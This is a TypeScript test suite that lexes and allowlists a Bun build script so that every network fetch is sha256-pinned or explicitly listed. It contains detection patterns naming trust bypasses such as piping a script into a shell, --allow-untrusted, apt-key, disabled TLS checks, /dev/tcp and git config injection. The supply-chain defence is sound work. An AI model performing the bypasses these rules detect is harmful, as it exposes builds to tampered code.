import { describe, expect, it } from 'bun:test';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { parse } from 'yaml';
import {
  render as renderUnpinned,
  entries as unpinnedEntries,
} from '../infra/bun-base/unpinned.mjs';

/**
 * #1452 — the patched-Bun build runs least-privilege and fetches nothing unverified that could be
 * pinned. Comment lines are stripped: they explain the design and may name the forbidden forms.
 */
const dir = resolve(import.meta.dirname, '..', 'infra/bun-base');
const code = (f: string) =>
  readFileSync(resolve(dir, f), 'utf8')
    .split('\n')
    .filter((l) => !l.trimStart().startsWith('#'))
    .join('\n');
const build = code('build.sh');
const cloudbuild = code('cloudbuild.yaml');

describe('cloudbuild.yaml runs as the dedicated build SA', () => {
  it('pins serviceAccount to bun-base-build, never the default compute SA', () => {
    expect(cloudbuild).toMatch(
      /^serviceAccount: projects\/gsw-mcp\/serviceAccounts\/bun-base-build@gsw-mcp\.iam\.gserviceaccount\.com$/m,
    );
    expect(cloudbuild).not.toMatch(/compute@developer/);
    expect(cloudbuild).toMatch(/logging: CLOUD_LOGGING_ONLY/);
  });

  it('SBOMs the built artifacts, not only the source tree', () => {
    expect(cloudbuild).toMatch(/scan, dir:\/workspace\/out\b/);
    expect(cloudbuild).toContain('bun-artifacts.cdx.json.sha256');
  });
});

describe('build.sh verifies every pinnable fetch', () => {
  it.each([
    ['apk --allow-untrusted', /--allow-untrusted/],
    ['a script piped into a shell', /\|\s*(ba)?sh\b/],
    ['a key dropped into trusted.gpg.d', /trusted\.gpg\.d/],
  ])('never uses %s', (_n, re) => {
    expect(build).not.toMatch(re);
  });

  const pins = readFileSync(resolve(dir, 'fetch-pins.sha256'), 'utf8').trim().split('\n');
  it.each([
    ['bootstrap bun zip', 'bun-linux-x64.zip'],
    ['rustup-init', 'rustup-init'],
    ['apk-tools-static', 'apk-tools-static.apk'],
  ])('checks the %s against its in-repo sha256 pin', (_n, file) => {
    expect(pins.filter((l) => l.endsWith(`  ${file}`))).toHaveLength(1);
    expect(pins).toContainEqual(
      expect.stringMatching(new RegExp(`^[0-9a-f]{64}  ${file.replace(/\./g, '\\.')}$`)),
    );
    expect(build).toMatch(
      new RegExp(`(^|\\(cd /tmp && )pin ${file.replace(/\./g, '\\.')}\\)?$`, 'm'),
    );
  });

  it('pins the apt.llvm.org key fingerprint and the LLVM package version', () => {
    expect(build).toMatch(/^LLVM_SIGNER_FPR='(?:[0-9A-F]{4} {1,2}){9}[0-9A-F]{4}'$/m);
    expect(build).toContain('[ "$fpr" = "${LLVM_SIGNER_FPR// /}" ] ||');
    expect(build).toContain('signed-by=/etc/apt/keyrings/apt.llvm.org.gpg');
    for (const pkg of ['clang', 'lld', 'llvm', 'libclang-rt', 'libclang-common']) {
      expect(build).toMatch(new RegExp(`${pkg}-\\$LLVM_MAJOR(-dev)?="\\$LLVM_PKG_VERSION"`));
    }
  });

  it('secret-scan hygiene: no NAME=<32+ hex> assignment in build.sh', () => {
    expect(build).not.toMatch(/^\s*(export\s+)?[A-Za-z_][A-Za-z0-9_]*=['"]?[0-9A-Fa-f]{32,}/m);
  });

  it('verifies Alpine packages against the checked-in keys', () => {
    expect(build).toContain('--keys-dir "$WS/keys/$apkarch"');
    expect(build).toContain('sha256sum -c --strict SHA256SUMS');
    const sums = readFileSync(resolve(dir, 'keys/SHA256SUMS'), 'utf8').trim().split('\n');
    for (const arch of ['x86_64', 'aarch64']) {
      expect(sums.some((l) => new RegExp(`^[0-9a-f]{64}  ${arch}/\\S+\\.rsa\\.pub$`).test(l))).toBe(
        true,
      );
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────
// ALLOWLIST scan (round 4). build.sh and prefix.sh are lexed into simple commands (quotes, $(),
// $(( )), ${ }, heredoc bodies, redirections, case patterns, function bodies). Wrappers (timeout,
// env, command, nice, xargs, sudo, …) and git global options are stripped, then EVERY command must
// match an allowed shape — an unknown head is red. Network-capable commands are allowed only in the
// exact argument shapes build.sh needs, and each must be followed by its verifier (before the next
// network command) or match an entry of unpinned-fetches.json (the list the README renders).
//
// LIMIT (also in README.md "Known limits"): this checks the presence, shape and and-or position of
// commands, not control flow. A verifier inside a branch that never runs still counts.
// ─────────────────────────────────────────────────────────────────────────────────────────────

export type Cmd = {
  words: string[];
  redirs: string[];
  /** Operator that ended the command, and the one before it (`&&`, `||`, `|`, `;`, `\n`, `)`, …). */
  op: string;
  prev: string;
  /** Command-substitution depth: 0 = the script's own control flow. */
  depth: number;
  /** Enclosing function, if any. */
  fn: string | null;
  /** Innermost `{ … }` group id (0 = none) and the id this command opened, if it began with `{`. */
  group: number;
  opens: number | null;
  /** Runs as an if/elif/while/until/! condition: its failure does not stop the script. */
  cond: boolean;
  line: number;
};

const OPS = [';;', '&&', '||', ';', '|', '&', '(', ')'];
const REDIR = /^(\d*|&)(<<<|<<-|<<|<>|>>|>&|<&|>\||>|<)/;
const ASSIGN = /^([A-Za-z_][A-Za-z0-9_]*)(\[[^\]]*\])?\+?=/;

class Lexer {
  cmds: Cmd[] = [];
  problems: string[] = [];
  fnDefs: string[] = [];
  private pos = 0;
  private heredocs: { delim: string; quoted: boolean }[] = [];
  private braces: { id: number; fn: string | null }[] = [];
  private nextId = 1;
  private pendingFn: string | null = null;
  private cases: ('pattern' | 'body')[] = [];
  constructor(private src: string) {}

  run(): this {
    this.list(0, false);
    if (this.braces.length) this.problems.push('unbalanced { }');
    return this;
  }

  private lineAt(p: number): number {
    return this.src.slice(0, p).split('\n').length;
  }

  private list(depth: number, inSub: boolean): void {
    let words: string[] = [];
    let redirs: string[] = [];
    let paren = 0;
    let prev = 'BOS';
    let start = this.pos;
    const end = (op: string) => {
      if (this.finish(words, redirs, op, prev, depth, start)) prev = op;
      words = [];
      redirs = [];
      start = this.pos;
    };
    for (;;) {
      const c = this.src[this.pos];
      if (c === undefined) {
        end('EOF');
        if (inSub) this.problems.push('unterminated $(');
        return;
      }
      if (c === ' ' || c === '\t') {
        this.pos++;
        continue;
      }
      if (c === '\\' && this.src[this.pos + 1] === '\n') {
        this.pos += 2;
        continue;
      }
      if (c === '#' && (this.pos === 0 || /[\s;&|()]/.test(this.src[this.pos - 1]!))) {
        while (this.src[this.pos] !== undefined && this.src[this.pos] !== '\n') this.pos++;
        continue;
      }
      if (c === '\n') {
        this.pos++;
        end('\n');
        this.bodies(depth);
        start = this.pos;
        continue;
      }
      const rest = this.src.slice(this.pos, this.pos + 8);
      if (/^[<>]\(/.test(rest)) {
        this.pos += 2;
        this.list(depth + 1, true);
        words.push('<(…)');
        continue;
      }
      const rd = REDIR.exec(rest);
      if (rd) {
        this.pos += rd[0].length;
        const op = rd[0];
        if (rd[2] === '<<' || rd[2] === '<<-') {
          while (this.src[this.pos] === ' ') this.pos++;
          const w = this.word(depth);
          this.heredocs.push({ delim: w.replace(/['"\\]/g, ''), quoted: /['"\\]/.test(w) });
          redirs.push(op + w);
        } else if (op.endsWith('&') && /^(\d+|-)/.test(this.src.slice(this.pos))) {
          const m = /^(\d+|-)/.exec(this.src.slice(this.pos))!;
          this.pos += m[0].length;
          redirs.push(op + m[0]);
        } else {
          while (this.src[this.pos] === ' ') this.pos++;
          redirs.push(op + this.word(depth));
        }
        continue;
      }
      const op = OPS.find((o) => this.src.startsWith(o, this.pos));
      if (op) {
        this.pos += op.length;
        if (op === '(') {
          if (words.length === 1 && redirs.length === 0 && this.src[this.pos] === ')') {
            this.pendingFn = words[0]!;
            this.fnDefs.push(words[0]!);
            this.pos++;
            words = [];
            continue;
          }
          end('(');
          paren++;
          continue;
        }
        if (op === ')') {
          if (this.cases[this.cases.length - 1] === 'pattern' || words[0] === 'case') end(')');
          else if (paren > 0) {
            paren--;
            end(')');
          } else if (inSub) {
            end(')');
            return;
          } else {
            this.problems.push(`unbalanced ) at line ${this.lineAt(this.pos)}`);
            end(')');
          }
          continue;
        }
        end(op);
        continue;
      }
      const s = this.pos;
      const w = this.word(depth);
      if (this.pos === s) {
        this.problems.push(`unlexable character ${JSON.stringify(c)} at line ${this.lineAt(s)}`);
        this.pos++;
        continue;
      }
      words.push(w);
    }
  }

  /** Heredoc bodies start after the newline that ends their command. Unquoted ones expand $(…). */
  private bodies(depth: number): void {
    while (this.heredocs.length) {
      const h = this.heredocs.shift()!;
      for (;;) {
        if (this.pos >= this.src.length) {
          this.problems.push(`unterminated heredoc ${h.delim}`);
          return;
        }
        let nl = this.src.indexOf('\n', this.pos);
        if (nl < 0) nl = this.src.length;
        const line = this.src.slice(this.pos, nl);
        if (line.replace(/^\t+/, '') === h.delim) {
          this.pos = nl + 1;
          break;
        }
        if (h.quoted) this.pos = nl + 1;
        else {
          while (this.pos < nl) {
            const c = this.src[this.pos];
            if (c === '\\') this.pos += 2;
            else if (c === '$') this.dollar(depth);
            else if (c === '`') this.backtick();
            else this.pos++;
          }
          this.pos = Math.max(this.pos, nl) + 1;
        }
      }
    }
  }

  private word(depth: number): string {
    const s = this.pos;
    for (;;) {
      const c = this.src[this.pos];
      if (c === undefined) break;
      if (' \t\n;&|()<>'.includes(c)) {
        // array literal: NAME=( … )
        if (c === '(' && /^[A-Za-z_][A-Za-z0-9_]*\+?=$/.test(this.src.slice(s, this.pos))) {
          this.pos++;
          while (this.src[this.pos] !== undefined && this.src[this.pos] !== ')') {
            const d = this.src[this.pos];
            if (d === '"') this.dquote(depth);
            else if (d === "'") this.squote();
            else if (d === '$') this.dollar(depth);
            else this.pos++;
          }
          this.pos++;
          continue;
        }
        break;
      }
      if (c === '\\') this.pos += 2;
      else if (c === "'") this.squote();
      else if (c === '"') this.dquote(depth);
      else if (c === '`') this.backtick();
      else if (c === '$') this.dollar(depth);
      else this.pos++;
    }
    return this.src.slice(s, this.pos);
  }

  private squote(): void {
    const e = this.src.indexOf("'", this.pos + 1);
    if (e < 0) {
      this.problems.push('unterminated single quote');
      this.pos = this.src.length;
    } else this.pos = e + 1;
  }

  private backtick(): void {
    this.problems.push(`backtick command substitution at line ${this.lineAt(this.pos)}`);
    const e = this.src.indexOf('`', this.pos + 1);
    this.pos = e < 0 ? this.src.length : e + 1;
  }

  private dquote(depth: number): void {
    this.pos++;
    for (;;) {
      const c = this.src[this.pos];
      if (c === undefined) {
        this.problems.push('unterminated double quote');
        return;
      }
      if (c === '\\') this.pos += 2;
      else if (c === '"') {
        this.pos++;
        return;
      } else if (c === '$') this.dollar(depth);
      else if (c === '`') this.backtick();
      else this.pos++;
    }
  }

  private dollar(depth: number): void {
    if (this.src.startsWith('$((', this.pos)) {
      this.arith(depth);
      return;
    }
    if (this.src.startsWith('$(', this.pos)) {
      this.pos += 2;
      this.list(depth + 1, true);
      return;
    }
    if (this.src.startsWith('${', this.pos)) {
      this.pos += 2;
      let nest = 1;
      while (nest > 0 && this.src[this.pos] !== undefined) {
        const c = this.src[this.pos];
        if (c === '\\') this.pos += 2;
        else if (c === '"') this.dquote(depth);
        else if (this.src.startsWith('$(', this.pos) || this.src.startsWith('${', this.pos))
          this.dollar(depth);
        else {
          if (c === '{') nest++;
          if (c === '}') nest--;
          this.pos++;
        }
      }
      return;
    }
    this.pos++;
  }

  private arith(depth: number): void {
    this.pos += 3;
    let nest = 0;
    for (;;) {
      const c = this.src[this.pos];
      if (c === undefined) {
        this.problems.push('unterminated $((');
        return;
      }
      if (c === '$') this.dollar(depth);
      else if (c === '(') {
        nest++;
        this.pos++;
      } else if (c === ')') {
        if (nest === 0 && this.src[this.pos + 1] === ')') {
          this.pos += 2;
          return;
        }
        nest--;
        this.pos++;
      } else this.pos++;
    }
  }

  /** Emits one simple command; returns false when nothing was emitted. */
  private finish(
    words: string[],
    redirs: string[],
    op: string,
    prev: string,
    depth: number,
    at: number,
  ): boolean {
    const line = this.lineAt(at);
    if (this.cases[this.cases.length - 1] === 'pattern' && words[0] !== 'esac' && words.length) {
      if (op === ')') this.cases[this.cases.length - 1] = 'body';
      return false; // a case pattern, not a command
    }
    if (words[0] === 'case') {
      const inAt = words.indexOf('in');
      this.cases.push(op === ')' && inAt >= 0 && words.length > inAt + 1 ? 'body' : 'pattern');
      return false;
    }
    let cond = false;
    let opens: number | null = null;
    let w = [...words];
    for (;;) {
      const h = w[0];
      if (h === undefined) break;
      if (['if', 'elif', 'while', 'until', '!'].includes(h)) cond = true;
      else if (h === '{') {
        opens = this.nextId++;
        this.braces.push({ id: opens, fn: this.pendingFn });
        this.pendingFn = null;
        if (cond) this.problems.push(`line ${line}: a { } group used as a condition`);
      } else if (h === '}') this.braces.pop();
      else if (h === 'esac') this.cases.pop();
      else if (!['then', 'else', 'do', 'fi', 'done'].includes(h)) break;
      w = w.slice(1);
    }
    if (op === ';;' && this.cases[this.cases.length - 1] === 'body')
      this.cases[this.cases.length - 1] = 'pattern';
    if (op === '&') this.problems.push(`line ${line}: backgrounded command (its failure is lost)`);
    if (!w.length && !redirs.length) {
      if (op === '&&' || op === '||')
        this.problems.push(
          `line ${line}: a compound command in an && / || list (set -e is off inside it)`,
        );
      if (cond && op === '(') this.problems.push(`line ${line}: a subshell used as a condition`);
      return false;
    }
    const fn = [...this.braces].reverse().find((b) => b.fn)?.fn ?? null;
    this.cmds.push({
      words: w,
      redirs,
      op,
      prev,
      depth,
      fn,
      group: this.braces[this.braces.length - 1]?.id ?? 0,
      opens,
      cond,
      line,
    });
    return true;
  }
}

export function lex(script: string): Lexer {
  return new Lexer(script).run();
}

const unq = (w: string) => w.replace(/^["']|["']$/g, '');

/** Wrappers stripped before classification: option words taking an argument, then positionals. */
const WRAPPERS: Record<string, { arg: string[]; pos: number; bad?: RegExp }> = {
  timeout: { arg: ['-s', '--signal', '-k', '--kill-after'], pos: 1 },
  env: {
    arg: ['-u', '--unset', '-C', '--chdir'],
    pos: 0,
    bad: /^(-S|--split-string|-[a-zA-Z]*S)/,
  },
  command: { arg: [], pos: 0 },
  nice: { arg: ['-n', '--adjustment'], pos: 0 },
  ionice: { arg: ['-c', '--class', '-n', '--classdata', '-p', '-P', '-u'], pos: 0 },
  stdbuf: { arg: ['-i', '-o', '-e'], pos: 0 },
  nohup: { arg: [], pos: 0 },
  setsid: { arg: [], pos: 0 },
  exec: { arg: ['-a'], pos: 0 },
  sudo: {
    arg: ['-u', '-g', '-h', '-p', '-C', '-D', '-r', '-t', '-U', '-T'],
    pos: 0,
    bad: /^(-s|-i|-e|--shell|--login|--edit)$/,
  },
  chroot: { arg: [], pos: 1 },
  time: { arg: ['-f', '-o', '--format', '--output'], pos: 0 },
  xargs: {
    arg: ['-a', '-d', '-E', '-e', '-I', '-i', '-L', '-l', '-n', '-P', '-s', '--delimiter'],
    pos: 0,
  },
};

type Norm = { assigns: string[]; words: string[]; text: string; wrapped: string[]; bad: string[] };

export function normalize(c: Cmd): Norm {
  let w = [...c.words];
  const assigns: string[] = [];
  const wrapped: string[] = [];
  const bad: string[] = [];
  for (;;) {
    while (w[0] !== undefined && ASSIGN.test(w[0])) assigns.push(ASSIGN.exec(w.shift()!)![1]!);
    const h = w[0] === undefined ? undefined : unq(w[0]).split('/').pop()!;
    const spec = h === undefined ? undefined : WRAPPERS[h];
    if (!spec || !h) break;
    wrapped.push(h);
    w = w.slice(1);
    while (w[0] !== undefined && (w[0].startsWith('-') || (h === 'env' && ASSIGN.test(w[0])))) {
      const o = w.shift()!;
      if (spec.bad?.test(o)) bad.push(`${h} ${o}`);
      if (spec.arg.includes(o)) w.shift();
    }
    w = w.slice(spec.pos);
  }
  if (wrapped.length && !w.length) bad.push(`${wrapped.join(' ')} with no command`);
  if (unq(w[0] ?? '') === 'git') {
    const rest = w.slice(1);
    while (rest[0]?.startsWith('-')) {
      const o = rest.shift()!;
      if (o === '-c' || o.startsWith('--config-env')) bad.push(`git ${o} (config injection)`);
      if (['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env'].includes(o))
        rest.shift();
    }
    w = ['git', ...rest];
  }
  return { assigns, words: w, text: w.join(' '), wrapped, bad };
}

/** Names build.sh / prefix.sh may assign, export, loop over or read into. */
const VARS = new Set(
  (
    'DEBIAN_FRONTEND HOME LC_ALL WS SRC OUT LLVM_MAJOR LLVM_PKG_VERSION LLVM_SIGNER_FPR ALPINE_RELEASE ' +
    'APK_TOOLS_STATIC_VERSION BOOTSTRAP_BUN RUSTUP_VERSION line TARGETS T0 PREFIX UPSTREAM_SHA PATCHES p ' +
    'name t fpr base PATH repo pair _ apkarch root GIT_COMMITTER_NAME GIT_COMMITTER_EMAIL HEAD_SHA wk ' +
    'BUN_BUILD_PREFETCH_DIR WK_KEY arch wkarch wkurl wkfile bd LD a here sha patches ph IFS'
  ).split(' '),
);

const APT_ALLOWED = new Set(
  'curl wget ca-certificates lsb-release gnupg cmake git golang libtool ninja-build pkg-config ruby-full xz-utils nasm unzip python3 build-essential libicu-dev perl zstd file'.split(
    ' ',
  ),
);
const APT_LLVM =
  /^(clang|lld|llvm|libclang-rt|libclang-common)-\$LLVM_MAJOR(-dev)?="\$LLVM_PKG_VERSION"$/;

/** Heads whose arguments cannot fetch or execute: any arguments allowed. */
const FREE =
  /^(echo|printf|grep|cut|tail|tee|cat|mkdir|ln|cp|rm|install|chmod|unzip|test|\[|\[\[|cd|basename|dirname|pwd|date|lsb_release|sha256sum|file|read|declare|local|export|pin|lap|for)( |$)/;
/** Exact non-network commands (interpreters and exec-capable tools only in these shapes). */
const EXACT = new Set([
  'set -euo pipefail',
  'shopt -s nullglob',
  'exit 1',
  `awk -F: '/^fpr:/ && !n++ {print $10}' /tmp/llvm.colons`,
  `awk '!/^#/ && NF { print $1; exit }' "$here/UPSTREAM_SHA"`,
  `sed 's/,$//'`,
  'tar -xzi -f /tmp/apk-tools-static.apk -C /tmp/apk sbin/apk.static',
  'gpg --show-keys --with-colons /tmp/llvm.asc',
  'gpg --dearmor',
  '"$LD" --library-path /opt/linux-sysroot-musl/usr/lib:/opt/linux-sysroot-musl/lib "$OUT/bun-linux-x64-musl" --revision',
  'bash "$WS/prefix.sh"',
  'git init -q "$SRC"',
  'git remote add origin https://github.com/oven-sh/bun.git',
  'git checkout -q FETCH_HEAD',
  'git rev-parse HEAD',
  'git am --committer-date-is-author-date "${PATCHES[@]}"',
]);
/** Network-capable commands, in the only shapes allowed. */
const NET_EXACT = new Set([
  'apt-get update -qq',
  'wget -qO /tmp/llvm.asc https://apt.llvm.org/llvm-snapshot.gpg.key',
  'git fetch -q --depth 1 origin "$UPSTREAM_SHA"',
  '/tmp/rustup-init -y --profile minimal --default-toolchain none --no-modify-path',
  'rustup toolchain install',
  'rustup target add x86_64-unknown-linux-musl aarch64-unknown-linux-musl',
  '/tmp/apk/sbin/apk.static --arch "$apkarch" --root "$root" --repository "$repo" --keys-dir "$WS/keys/$apkarch" --no-cache --initdb add musl-dev libc-dev linux-headers g++ libstdc++-dev',
  'bun install --frozen-lockfile',
  'bun scripts/build.ts --profile=release --os=linux --arch="$arch" --abi=musl --canary=off --build-dir="$bd"',
]);
const CONSUMED =
  'grep -qF "using prefetch cache: $BUN_BUILD_PREFETCH_DIR/by-url/${WK_KEY[$arch]}" "/tmp/build-$arch.log"';
const SHASUMS_CHECK = `grep -qxF "$(grep -E '  bun-linux-x64\\.zip$' "$WS/fetch-pins.sha256")" SHASUMS256.txt`;
/** Commands allowed to touch apt's configuration (the signed-by LLVM source and its keyring). */
const APT_CONF_OK = new Set([
  'mkdir -p /etc/apt/keyrings',
  'gpg --dearmor </tmp/llvm.asc >/etc/apt/keyrings/apt.llvm.org.gpg',
  'echo "deb [signed-by=/etc/apt/keyrings/apt.llvm.org.gpg] http://apt.llvm.org/$(lsb_release -cs)/ llvm-toolchain-$(lsb_release -cs)-$LLVM_MAJOR main" >/etc/apt/sources.list.d/llvm.list',
]);
const TRUST_BYPASS =
  /--allow-untrusted|allow-unauthenticated|allow-insecure-repositories|AllowInsecureRepositories|AllowDowngradeToInsecureRepositories|AllowUnauthenticated|trusted=yes|apt-key|trusted\.gpg\.d|GIT_SSL_NO_VERIFY|sslVerify|NODE_TLS_REJECT_UNAUTHORIZED|\/dev\/(tcp|udp)\//i;

/** curl in the allowed shape: -fsSL…, https only, one URL, one output file. */
function curlShape(words: string[], httpsVars: Set<string>): { out: string } | { bad: string } {
  const args = words.slice(1);
  let url: string | undefined;
  let out: string | undefined;
  let O = false;
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!;
    if (a === '-fsSL' || a === '--tlsv1.2') continue;
    if (a === '-fsSLO') O = true;
    else if (a === '--proto' && args[i + 1] === "'=https'") i++;
    else if (a === '-o' || a === '-fsSLo') out = args[++i];
    else if (a.startsWith('-')) return { bad: `curl option ${a} not allowed` };
    else if (url) return { bad: 'curl with more than one URL' };
    else url = a;
  }
  if (!url) return { bad: 'curl without a URL' };
  const u = unq(url);
  const v = /^\$\{?([A-Za-z_][A-Za-z0-9_]*)/.exec(u);
  if (!(u.startsWith('https://') || (v && httpsVars.has(v[1]!))))
    return { bad: `curl URL is not https: ${url}` };
  if (O === !!out) return { bad: 'curl must write exactly one named file (-O xor -o)' };
  return { out: (O ? u : unq(out!)).split('/').pop()! };
}

export function scanBuildScript(
  script: string,
  unpinned: { id: string; match: string | null }[],
  pins: string[] = [],
): string[] {
  const lx = lex(script);
  const v = [...lx.problems];
  const cmds = lx.cmds;
  const code = script
    .split('\n')
    .filter((l) => !l.trimStart().startsWith('#'))
    .join('\n');
  if (!cmds.some((c) => c.depth === 0 && !c.fn && c.words.join(' ') === 'set -euo pipefail'))
    v.push('set -euo pipefail missing');
  if (TRUST_BYPASS.test(code)) v.push(`trust bypass: ${TRUST_BYPASS.exec(code)![0]}`);

  const httpsVars = new Set<string>();
  for (const c of cmds)
    for (const w of c.words) {
      const m = /^([A-Za-z_][A-Za-z0-9_]*)="https:\/\//.exec(w);
      if (m) httpsVars.add(m[1]!);
    }

  const matched = new Set<string>();
  const norms = cmds.map(normalize);
  const isNet = (i: number) =>
    NET_EXACT.has(norms[i]!.text) || /^(curl|apt-get) /.test(norms[i]!.text);
  const effective = (c: Cmd) =>
    !c.cond && c.depth === 0 && !c.fn && c.op !== '&&' && c.prev !== '||' && c.op !== '&';

  cmds.forEach((c, i) => {
    const n = norms[i]!;
    const at = `line ${c.line}: ${n.text.slice(0, 70)}`;
    v.push(...n.bad.map((b) => `${at}: ${b}`));
    for (const a of n.assigns) if (!VARS.has(a)) v.push(`${at}: assigns unknown variable ${a}`);

    // Fail-open: `||` must lead to `exit N` or a `{ …; exit N; }` group.
    if (c.op === '||') {
      const nx = cmds.slice(i + 1).find((d) => d.depth === c.depth);
      const exits = (d: Cmd) => /^exit [1-9][0-9]*$/.test(d.words.join(' '));
      const ok =
        nx &&
        (exits(nx) || (nx.opens !== null && cmds.some((d) => d.group === nx.opens && exits(d))));
      if (!ok) v.push(`${at}: || that does not exit`);
    }
    // A check used as a condition, or first in an && list, cannot stop the script.
    if (c.cond && !/^(\[|\[\[|test)$/.test(n.words[0] ?? ''))
      v.push(
        `${at}: only [ / [[ / test may be a condition (anything else has its failure swallowed)`,
      );
    if (c.op === '&&' && (/^(pin|sha256sum|grep|test|\[|\[\[)$/.test(n.words[0] ?? '') || isNet(i)))
      v.push(`${at}: a check or fetch before && (its failure does not stop the script)`);

    const conf = [...c.words, ...c.redirs].join(' ');
    if (/\/etc\/apt|sources\.list|apt\.conf|preferences\.d/.test(conf)) {
      const full = [c.words.join(' '), ...c.redirs].join(' ');
      if (!APT_CONF_OK.has(full)) v.push(`${at}: writes apt configuration`);
    }

    if (!n.words.length) return; // assignment-only
    const head = n.words[0]!;
    if (['export', 'local', 'declare'].includes(head))
      for (const x of n.words.slice(1).filter((x) => !x.startsWith('-')))
        if (!VARS.has(ASSIGN.exec(x)?.[1] ?? x)) v.push(`${at}: ${head} of unknown variable`);
    if (head === 'for' && !VARS.has(n.words[1] ?? '')) v.push(`${at}: unknown loop variable`);
    if (head === 'read')
      for (const x of n.words.slice(1).filter((x) => !x.startsWith('-')))
        if (!VARS.has(x)) v.push(`${at}: read into unknown variable`);

    const net = isNet(i);
    if (net && n.wrapped.includes('xargs')) v.push(`${at}: network command fed by xargs`);
    if (!net) {
      if (!FREE.test(n.text) && !EXACT.has(n.text))
        v.push(`${at}: command not in the allowlist (head ${head})`);
      return;
    }
    // ── network command: allowed shape, then unpinned entry or verifier ──
    if (head === 'apt-get' && !NET_EXACT.has(n.text)) {
      const m = /^apt-get install -y -qq( --no-install-recommends)? (.+)$/.exec(n.text);
      if (!m) v.push(`${at}: apt-get in a shape that is not allowed`);
      else
        for (const t of m[2]!.split(' '))
          if (!APT_ALLOWED.has(t) && !APT_LLVM.test(t))
            v.push(`${at}: apt package outside the pinned set: ${t}`);
    }
    let out: string | undefined;
    if (head === 'curl') {
      const s = curlShape(n.words, httpsVars);
      if ('bad' in s) v.push(`${at}: ${s.bad}`);
      else out = s.out;
    }
    const u = unpinned.find((e) => e.match && new RegExp(e.match).test(n.text));
    if (u) {
      matched.add(u.id);
      return;
    }
    let j = i + 1;
    while (j < cmds.length && !isNet(j)) j++;
    const region = cmds.slice(i + 1, j).map((d, k) => ({ d, n: norms[i + 1 + k]! }));
    const has = (text: string) => region.some(({ d, n: m }) => effective(d) && m.text === text);
    if (head === 'curl' && out) {
      if (out === 'SHASUMS256.txt') {
        if (!has(SHASUMS_CHECK)) v.push(`${at}: SHASUMS cross-check missing after the fetch`);
      } else {
        const pinAt = region.findIndex(
          ({ d, n: m }) =>
            effective(d) &&
            m.words[0] === 'pin' &&
            m.words.length === 2 &&
            unq(m.words[1]!) === out,
        );
        if (pinAt < 0)
          v.push(`${at}: fetched ${out} is not verified with pin before the next fetch`);
        for (const { d, n: m } of region.slice(0, Math.max(pinAt, 0)))
          if (m.words[0] !== 'cd' && [...d.words, ...d.redirs].join(' ').includes(out))
            v.push(`${at}: ${out} is used before it is pinned`);
        if (
          !out.includes('$') &&
          pins.length &&
          pins.filter((l) => l.endsWith(`  ${out}`)).length !== 1
        )
          v.push(`${at}: ${out} needs exactly one line in fetch-pins.sha256`);
      }
    } else if (head === 'wget') {
      if (!has('[ "$fpr" = "${LLVM_SIGNER_FPR// /}" ]'))
        v.push(`${at}: apt.llvm.org key fingerprint check missing after the fetch`);
    } else if (head === 'git') {
      if (!has('test "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"'))
        v.push(`${at}: rev-parse == UPSTREAM_SHA check missing after the fetch`);
    } else if (n.text.startsWith('bun scripts/build.ts')) {
      if (!has(CONSUMED))
        v.push(`${at}: no proof the build consumed the pinned WebKit (prefetch-cache log check)`);
      if (!region.some(({ n: m }) => m.text === 'tee "/tmp/build-$arch.log"'))
        v.push(`${at}: the build log is not captured for the consumption check`);
    } else v.push(`${at}: network command neither pinned nor listed in unpinned-fetches.json`);
  });

  for (const e of unpinned)
    if (e.match && !matched.has(e.id)) v.push(`stale unpinned entry (matches nothing): ${e.id}`);
  return v;
}

/** pin() exactly as reviewed: select one line, require exactly one, and end on sha256sum -c. */
const PIN_BODY = [
  'local line',
  'grep -E "^[0-9a-f]{64}  $1\\$" "$WS/fetch-pins.sha256"',
  'line="$(grep -E "^[0-9a-f]{64}  $1\\$" "$WS/fetch-pins.sha256")"',
  'printf \'%s\\n\' "$line"',
  'grep -c .',
  '[ "$(printf \'%s\\n\' "$line" | grep -c .)" = 1 ]',
  'echo "fetch-pins.sha256: need exactly one line for $1"',
  'exit 1',
  'printf \'%s\\n\' "$line"',
  'sha256sum -c -',
];

export function pinProblems(script: string): string[] {
  const lx = lex(script);
  const v: string[] = [];
  if (lx.fnDefs.filter((f) => f === 'pin').length !== 1)
    v.push('pin() must be defined exactly once');
  const body = lx.cmds.filter((c) => c.fn === 'pin');
  const texts = body.map((c) => c.words.join(' '));
  if (JSON.stringify(texts) !== JSON.stringify(PIN_BODY))
    v.push(`pin() body differs from the reviewed one: ${JSON.stringify(texts)}`);
  const last = body[body.length - 1];
  if (!last || last.words.join(' ') !== 'sha256sum -c -' || last.prev !== '|' || last.op === '&&')
    v.push('pin() must end on `… | sha256sum -c -` so its status is the verification');
  return v;
}

describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly listed', () => {
  const unpinned = unpinnedEntries() as { id: string; match: string | null; why: string }[];
  const real = readFileSync(resolve(dir, 'build.sh'), 'utf8');
  const prefix = readFileSync(resolve(dir, 'prefix.sh'), 'utf8');
  const pins = readFileSync(resolve(dir, 'fetch-pins.sha256'), 'utf8').trim().split('\n');
  const scan = (t: string) => [...scanBuildScript(t, unpinned, pins), ...pinProblems(t)];

  it('the real build.sh has no violations', () => {
    expect(scan(real)).toEqual([]);
  });

  it('prefix.sh (the one script build.sh may run with bash) passes the same allowlist', () => {
    expect(scanBuildScript(prefix, [])).toEqual([]);
  });

  it('the lexer sees every network command build.sh makes', () => {
    const cmds = lex(real).cmds.map(normalize);
    const net = cmds.filter((n) => NET_EXACT.has(n.text) || /^(curl|apt-get) /.test(n.text));
    expect(net.length).toBe(17);
  });

  it('both WebKit tarballs are pinned', () => {
    for (const a of ['amd64', 'arm64'])
      expect(
        pins.filter((l) =>
          new RegExp(`  bun-webkit-linux-${a}-musl-lto-[0-9a-f]{16}\\.tar\\.gz$`).test(l),
        ),
      ).toHaveLength(1);
  });

  it('README block is generated from unpinned-fetches.json (no drift)', () => {
    expect(readFileSync(resolve(dir, 'README.md'), 'utf8')).toContain(renderUnpinned());
  });

  it('every unpinned entry has a reason', () => {
    for (const e of unpinned) expect(e.why.length).toBeGreaterThan(20);
  });

  const sub = (from: string, to: string) => {
    expect(real.split(from).length, `anchor occurs exactly once: ${from}`).toBe(2);
    return real.replace(from, to);
  };
  const add = (line: string) => sub('lap sysroots', `${line}\nlap sysroots`);
  // In-suite mutation proofs: each is a weakening an earlier guard let through.
  it.each([
    [
      'download-to-file then bash file',
